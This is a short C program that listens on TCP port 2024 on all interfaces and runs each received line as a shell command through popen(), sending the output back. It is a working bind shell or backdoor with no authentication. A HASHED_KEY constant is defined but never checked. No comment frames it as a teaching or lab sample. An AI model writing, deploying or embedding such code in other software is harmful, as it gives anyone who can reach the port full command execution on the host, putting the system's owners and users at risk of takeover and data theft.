#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 2024
#define BUFFER_SIZE 4096
#define HASHED_KEY "hashed_key_value"

void execute_command(int client_socket) {
    char buffer[4096];
    char end_delim[] = "\nEND\n";

    while (1) {
        memset(buffer, 0, sizeof(buffer)); // Clear the buffer for each command

        ssize_t bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0 || strncmp(buffer, "exit", 4) == 0) {
            break;
        }

        FILE *fp = popen(buffer, "r");
        if (!fp) {
            send(client_socket, "Failed to run command.\n", 23, 0);
            continue;
        }

        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send(client_socket, buffer, strlen(buffer), 0);
        }
        send(client_socket, end_delim, strlen(end_delim), 0); // Send delimiter
        pclose(fp);
    }
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    if (listen(server_socket, 5) < 0) {
        perror("listen");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    printf("Listening on port %d...\n", PORT);

    while (1) {
        client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &client_addr_len);
        if (client_socket < 0) {
            perror("accept");
            continue;
        }

        execute_command(client_socket);

        close(client_socket);
    }

    return 0;
}
